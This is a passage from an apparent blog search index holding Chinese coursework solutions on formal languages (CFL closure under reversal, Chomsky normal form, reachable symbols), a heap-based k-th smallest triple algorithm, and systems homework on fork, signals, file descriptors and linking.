w^R.$$<br>​    假设 $S\mathop{\Longrightarrow}\limits_G^* w$, 归纳于该推导的长度 $n$.</p><p>​    $\circ$ $n = 1$ 时, $S\rightarrow w$ 为 $G$ 中的一个产生式, </p><p>​    因而 $S\rightarrow w^R$ 为 $G^R$ 的一个产生式, 所以 $S\mathop{\Longrightarrow}\limits_{G_R}^* w^R$.</p><p>​    $\circ$ $n &gt; 1$ 时, 设第一步推导使用了产生式 $S\rightarrow X_1X_2\cdots X_k$,</p><p>​    其中 $X_i\in V\cup T (1\le i\le k)$. 可以将 $w$ 打断为 $w = w_1w_2\cdots w_k$,</p><p>​    若 $X_i\in V$, 则存在 $w_i\in T^*$, 使得在少于 $n$ 步内 $X_i\mathop{\Longrightarrow}\limits_G^* w_i$,</p><p>​    由归纳假设, $X_i\mathop{\Longrightarrow}\limits^*_{G^R} w_i^R$.</p><p>​    若 $X_i\in T$, 则令 $w_i= X_i$, 亦有 $X_i\mathop{\Longrightarrow}\limits^*_{G^R} w_i^R$.</p><p>​    由构造方法, $G^R$ 中包含产生式 $S\rightarrow X_kX_{k - 1}\cdots X_1$. 故<br>$$<br>\begin{aligned}<br>S &amp;{\mathop{\Longrightarrow}\limits_{G^R}} X_kX_{k - 1}\cdots X_1 \<br>&amp;{\mathop{\Longrightarrow}\limits^*_{G^R}} w_k^RX_{k - 1}\cdots X_1 \<br>&amp;{\mathop{\Longrightarrow}\limits^*_{G^R}} w_k^Rw_{k - 1}^R\cdots X_1 \<br>&amp;{\mathop{\Longrightarrow}\limits^*_{G^R}} w_k^Rw_{k - 1}^R\cdots w_1^R \<br>&amp;= (w_1w_2\cdots w_k)^R \<br>&amp;= w^R.<br>\end{aligned}<br>$$<br>​    同理可证, 若 $S\mathop{\Longrightarrow}\limits_{G_R}^* w^R$, 则有 $S\mathop{\Longrightarrow}\limits_G^* w$.</p><p>​    由此可知 $L^R = L(G^R)$, $L^R$ 是上下文无关语言.</p><p>​    也即 $CFL$ 在反转运算下是封闭的.</p><h3 id="Ex-7-4-3-c"><a href="#Ex-7-4-3-c" class="headerlink" title="Ex.7.4.3(c)"></a>Ex.7.4.3(c)</h3><p>​    由 $CYK$ 算法构造的针对 $aabab$ 的表如下:</p><p> <img src="/pic/44.png"></p><p>​    由于 $S\in X_{15}$, 所以 $aabab\in L(G)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业9</title>
      <link href="/39/"/>
      <url>/39/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-7-1-3"><a href="#Ex-7-1-3" class="headerlink" title="Ex 7.1.3"></a>Ex 7.1.3</h3><p>​    (a) 符号 $S$, $A$, $B$, $C$ 是可致空的.<br>​    消去 $\varepsilon$-产生式后得到新的产生式:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow 0A0 \mid 1B1 \mid 00 \mid 11 \mid BB \mid B \<br>A &amp;\rightarrow C \<br>B &amp;\rightarrow S \mid A \<br>C &amp;\rightarrow S<br>\end{aligned}<br>$$<br>​    (b) 单位偶对有 $(A,A)$, $(B,B)$, $(C,C)$, $(S,S)$, $(A,C)$, $(A,S)$, $(A,B)$,<br>​    $(B,A)$, $(B,C)$, $(B,S)$, $(C,A)$, $(C,B)$, $(C,S)$, $(S,A)$, $(S,B)$, $(S,C)$.<br>​    消去单位产生式后得到新的产生式:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \<br>A &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \<br>B &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \<br>C &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11<br>\end{aligned}<br>$$<br>​    (c) $C$ 为无用符号.<br>​    (d) 消去无用符号 $C$ 得到新的产生式:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \<br>A &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11 \<br>B &amp;\rightarrow 0A0 \mid 1B1 \mid BB \mid 00 \mid 11<br>\end{aligned}<br>$$<br>​    引入非终结符 $D$, $E$, 增加产生式 $D \rightarrow 0$ 和 $E \rightarrow 1$, 得产生式:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow DAD \mid EBE \mid BB \mid DD \mid EE \<br>A &amp;\rightarrow DAD \mid EBE \mid BB \mid DD \mid EE \<br>B &amp;\rightarrow DAD \mid EBE \mid BB \mid DD \mid EE \<br>D &amp;\rightarrow 0 \<br>E &amp;\rightarrow 1<br>\end{aligned}<br>$$<br>​    引入非终结符 $F$, $G$, 增加产生式 $F \rightarrow DA$ 和 $G \rightarrow EB$, 得到 $Chomsky$ 范式:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow FD \mid GE \mid BB \mid DD \mid EE \<br>A &amp;\rightarrow FD \mid GE \mid BB \mid DD \mid EE \<br>B &amp;\rightarrow FD \mid GE \mid BB \mid DD \mid EE \<br>D &amp;\rightarrow 0 \<br>E &amp;\rightarrow 1 \<br>F &amp;\rightarrow DA \<br>G &amp;\rightarrow EB<br>\end{aligned}<br>$$</p><h3 id="Ex-7-1-9-b"><a href="#Ex-7-1-9-b" class="headerlink" title="Ex 7.1.9 (b)"></a>Ex 7.1.9 (b)</h3><p>​    首先证明所得符号是可达符号, 对推导使用结构归纳:</p><p>​    $\circ$ 注意到 $S\in V\cup T$, 且 $S\Rightarrow^{*}S$，所以 $S$ 为可达符号;</p><p>​    $\circ$ 设 $A$ 为可达符号, 且有产生式 $A\rightarrow\alpha$, $X$ 是 $\alpha$ 中的符号.</p><p>​    $\circ$ 则 $X\in V\cup T$. 即存在 $\beta, \gamma\in(V\cup T)^{*}$, 使得 $\alpha = \beta X\gamma$, </p><p>​    即 $A\rightarrow\beta X\gamma$ 是一个产生式. 因 $A$ 是可达符号, 由归纳假设, </p><p>​    存在 $\beta’, \gamma’\in(V\cup T)^{<em>}$, 使得 $S\Rightarrow^{</em>} \beta’ A\gamma’$, 进而 $S\Rightarrow^{*} \beta’\beta X\gamma\gamma’$, 所以 $X$ 是可达符号.</p><p>​    再证所有的可达符号都可由上述步骤得到:</p><p>​    $\circ$ 设 $X$ 是可达符号, 即存在 $\beta, \gamma\in(V\cup T)^{<em>}$, 使得 $S\Rightarrow^{</em>} \beta X\gamma$.</p><p>​    归纳于该推导的步数 $n$:</p><p>​    $\circ$ 若 $n = 0$, 一定有 $\beta X\gamma = S$, 只有 $X = S$ 可由上述步骤产生;</p><p>​    $\circ$ 若 $n &gt; 0$, 假设最后一步推导是 $\beta’ A\gamma’\Rightarrow^{*}\beta X\gamma$, </p><p>​    并使用了产生式 $A\rightarrow\beta^{‘’}X\gamma^{‘’}$. 因为 $S\Rightarrow^{*}\beta’ A\gamma’$ 的步数小于 $n$,<br>​    根据归纳假设，符号 $A$ 可由上述步骤产生. 结合产生式 $A\rightarrow\beta^{‘’}X\gamma^{‘’}$, 知 $X$ 也可由上述步骤产生.</p><p> 证毕。</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kth</title>
      <link href="/38/"/>
      <url>/38/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA4"><a href="#CST-PA4" class="headerlink" title="CST PA4"></a>CST PA4</h1><h2 id="4-3-Kth"><a href="#4-3-Kth" class="headerlink" title="4-3 Kth"></a>4-3 Kth</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>因为不能直接访问数组 <code>a</code>, <code>b</code>, <code>c</code> 中的元素, 我们定义数组 <code>u</code>, <code>v</code>, <code>w</code>, 将其初始化为 ${1, 2, …, n}$, 用于记录数组 <code>a</code>, <code>b</code>, <code>c</code> 中元素的 <code>index</code>.</p><p>将三元组视为三维空间中的点集, 我们需要返回点集之中坐标和第 <code>k</code> 小的三元组. 在 <code>compare</code> 接口中固定两维度 <code>index</code> 为 <code>1</code>, 我们可以比较单一维度的元素大小. 借此对三个数组分别进行快排, 排序结果反应在数组 <code>u</code>, <code>v</code>, <code>w</code> 中.</p><p>一般地, 若排序前数组 <code>u</code> 为 ${1, 2, …, n}$, 排序后为 ${u[1], u[2], …, u[n]}$, 即意味着数组 <code>a</code> 元素按大小升序排列为 ${a[u[1]], a[u[2]], …, a[u[n]]}$.</p><p>此时点集中坐标和最小的三元组即为 $a[u[1]], b[v[1]], c[w[1]]$. 我们维护一个最小堆 <code>MinHeap</code>, 将 $(1, 1, 1)$ 插入. 随后依次删除堆顶最小元组, 并插入坐标和恰好不小于删去堆顶坐标和的三元组.</p><p>第 <code>k</code> 次 <code>Delete</code> 得到的三元组 $(x, y, z)$ 对应的即是坐标和第 <code>k</code> 小的三元组 $a[u[x]], b[v[y]], c[w[z]]$.</p><p>对这个三维点集, 坐标和恰不小于 $(x, y, z)$ 的三元组必是 $(x, y, z + 1)$, $(x, y + 1, z)$, $(x + 1, y, z)$ 之一, 将其插入 <code>MinHeap</code> 即可. 考虑到同一个点可能会被压入多次, 调用 <code>k</code> 次 <code>Delete()</code> 后得到不是坐标和第 <code>k</code> 小的三元组, 特约定:</p><p>对于堆顶三元组 $(x, y, z)$, 我们插入 $(x, y, z + 1)$; 若 $z = 1$, 再插入 $(x, y + 1, z)$; 若 $y = z = 1$, 再插入 $(x + 1, y, z)$.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>在每次插入 $(x, y, z)$ 应该检查坐标是否合理, 否则会因非法插入, 使得 <code>compare</code> 函数报错.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>对数组 <code>a</code>, <code>b</code>, <code>c</code> 进行快速排序, 时间复杂度为 $O(nlogn)$;</p><p>在维护 <code>MinHeap</code> 的过程中, 进行 <code>k</code> 次 <code>Delete</code>, 至多进行 <code>3k</code> 次 <code>Insert</code>, 时间复杂度为 $O(klogk)$.</p><p>综上, 算法总体时间复杂度为 $O(nlogn + klogk)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>数组 <code>u</code>, <code>v</code>, <code>w</code> 动态分配的空间为 $O(n)$, 堆 <code>MinHeap</code> 消耗的空间为 $O(k)$, 因此算法总体空间复杂度为 $O(n + k)$.</p><p>本题中直接在堆内开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 13</span>class MinHeap <span class="token punctuation">{</span> <span class="token comment">// 实现一个三元之和最小堆.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>private<span class="token operator">:</span>    <span class="token keyword">int</span> elem<span class="token punctuation">[</span><span class="token number">4000100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $3\times 5\times 10^5 \times 4B + 1.2\times 10^7 \times 4B = 52MB &lt; 256MB$, 符合题目要求范围.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业5</title>
      <link href="/37/"/>
      <url>/37/</url>
      
        <content type="html"><![CDATA[<h1 id="Hw-5"><a href="#Hw-5" class="headerlink" title="Hw 5"></a>Hw 5</h1><ol><li><p>对于如下代码: 请回答以下问题  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio&gt;</span></span><span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        counter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"counter = %d\n"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 注意: 这里没有 counter++;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"counter = %d\n"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>程序会输出多少行? (空行不计算在内)</li></ol><p><strong>答:</strong> 会输出 10 行.</p><ol start="2"><li>程序第一行和最后一行分别会输出什么?</li></ol><p><strong>答:</strong> 第一行输出 <code>counter = 1</code>; 最后一行输出 <code>counter = 2</code>.</p><ol start="3"><li>根据系统对进程的调度情况, 程序一共有多少种可能的输出结果? (如果同一时间有若干进程在同时运行, 他们运行的先后顺序的不同可能导致输出结果不同)</li></ol><p><strong>答:</strong> 程序一共有 5 种可能的输出结果.</p><p>分别对应第一次 <code>fork</code> 的子线程在父线程 <code>4</code> 次 <code>counter = 2</code> 的输出之间.</p></li><li><p>对于如下代码:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token keyword">int</span> pid<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sig <span class="token operator">==</span> SIGINT <span class="token operator">&amp;&amp;</span> pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Killing Child process\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">kill</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Child process receiving Kill\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGKILL<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> status<span class="token punctuation">;</span>        <span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"child's exit status=%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Waiting...!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行过程中, 如果用户按下 <code>Ctrl+C</code>, 请问程序在一串 <code>Waiting…!</code> 之后会输出什么内容, 为什么? </p><p><strong>答:</strong> 会输出:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Child process receiving KillKilling Child processchild's <span class="token builtin class-name">exit</span> <span class="token assign-left variable">status</span><span class="token operator">=</span><span class="token number">255</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>fork</code> 后在父进程内调用 <code>waitpid</code>, 父进程自身被挂起.</p><p>按下 <code>Ctrl+C</code> 后, 系统内核发送 <code>SIGINT</code> 信号至父进程与子进程, 子进程接收 <code>SIGINT</code> 信号, 其信号处理函数输出 <code>Child process receiving Kill</code>, 子进程退出. </p><p>随后父进程恢复, 接受 <code>SIGINT</code> 信号, 其信号处理函数输出 <code>Killing Child process</code>, 最后通过 <code>WEXITSTATUS</code> 获取子进程退出状态, 输出 <code>child's exit status=255</code>.</p></li><li><p>对于如下代码, 程序将输出什么内容, 为什么? (<code>foo.txt</code> 和 <code>bar.txt</code> 文件存在)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd1<span class="token punctuation">,</span> fd2<span class="token punctuation">;</span>    fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"bar.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"bar.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fd2=%d\n"</span><span class="token punctuation">,</span> fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>答:</strong> 会输出 <code>fd2=4</code>.</p><p>进程创建时, <code>标准输入</code>, <code>标准输出</code>, <code>标准错误</code>已分别占用了描述符 <code>0</code>, <code>1</code>, <code>2</code>; 以只读方式打开文件 <code>foo.txt</code> 和 <code>bar.txt</code>, 可用描述符池分配 <code>fd1 = 3</code>, <code>fd2 = 4</code>; 关闭 <code>bar.txt</code> 后, 描述符 <code>4</code> 恢复到描述符池; 打开 <code>bar.txt</code> 后, 仍有 <code>fd2 = 4</code>.</p></li><li><p>在以下情形中, 分别需要使用什么 IO 方式来进行处理:</p><ol><li><p>编译器读取源文件  <strong>Standard IO.</strong></p></li><li><p>编译器生成可执行文件  <strong>Standard IO.</strong></p></li><li><p>处理图像文件  <strong>Standard  IO.</strong></p></li><li><p>程序需要读写超大规模的文件，运行过程中可能需要处理外部信号  <strong>Unix IO.</strong></p></li><li><p>访问网络内容  <strong>RIO.</strong></p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业4</title>
      <link href="/36/"/>
      <url>/36/</url>
      
        <content type="html"><![CDATA[<h1 id="Hw4"><a href="#Hw4" class="headerlink" title="Hw4"></a>Hw4</h1><ol><li><p>某代码由 <code>foo.c</code> 与 <code>bar.c</code> 构成. 内容如下: </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* foo.c */</span> <span class="token keyword">void</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* bar.c */</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span> </span><span class="token keyword">extern</span> <span class="token keyword">char</span> main<span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>main<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>( 具体取决于编译器实现 )</p><ol><li>请问能否正常联合编译? 如果可以联合编译则运行结果如何? 请说明你给出的回答的理由.</li></ol><p><strong>答:</strong> 可以正常联合编译. 运行结果为编译后 <code>main()</code> 函数的地址. 因为 <code>main</code> 函数在 <code>bar.c</code> 中声明, 联合编译后 <code>p2()</code> 函数会输出变量 <code>main</code> 存储的值, 即编译后 <code>main()</code> 函数的地址.</p><ol start="2"><li>如果去掉 <code>bar.c</code> 中的 <code>extern</code> 关键字, 能否正常联合编译? 如果可以联合编译则运行结果如何? 请说明你给出的回答的理由.</li></ol><p><strong>答:</strong> 可以正常联合编译. 运行结果为编译后 <code>main()</code> 函数的地址. (因为 <code>main</code> 为强定义, 会覆盖未初始化的弱定义 <code>char main</code>, 链接时不在乎类型.) 删去之后联合编译, 会在 <code>foo.c</code> 中得到其定义, 联合编译后 <code>p2()</code> 函数会输出 <code>main()</code> 函数的地址.</p></li><li><p>对于如下代码 <code>foo.c</code>, 如果编译为 <code>foo.o</code>, 那么在 <code>elf</code> 文件的以下段中, 会出现哪些符号? (如果有多种合法分布情况, 则任意给出一种即可).</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">3</span>   <span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">4</span><span class="token number">5</span>   <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>v1<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>v2<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>v3<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">6</span>       <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">*</span>v1<span class="token punctuation">,</span> <span class="token operator">*</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">7</span>   <span class="token punctuation">}</span> <span class="token number">8</span> <span class="token number">9</span>   <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">10</span>  <span class="token keyword">extern</span> <span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">11</span>  <span class="token keyword">static</span> <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">12</span> <span class="token number">13</span>  <span class="token keyword">int</span> <span class="token function">total_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token number">14</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">15</span>          <span class="token function">process</span><span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">,</span> b<span class="token operator">+</span>i<span class="token punctuation">,</span> c<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">16</span>      <span class="token punctuation">}</span> <span class="token number">17</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>( <code>gcc</code> 的内联函数需为 <code>static inline</code>. )</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.bss: a, b, c..data: 无. .text: total_process..symtab: add, process, a, b, c.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中对于 <code>total_process</code> 函数中用到的符号, 哪些会在编译期被定位, 哪些会在链接期被定位?</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">编译期定位的符号: i, total_process.链接期定位的符号: a, b, c.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>下面的问题涉及虚拟地址转换为物理地址</p><ul><li>内存是字节可寻址的  </li><li>内存访问是针对 <strong><code>1</code> 字节的字</strong>(即本题的 <code>word</code> 就是 <code>1</code> 个 <code>byte</code>)</li><li>虚拟地址 <code>16</code> 位宽 / 物理地址 <code>14</code> 位  </li><li>页面大小为 <code>1024</code> 字节  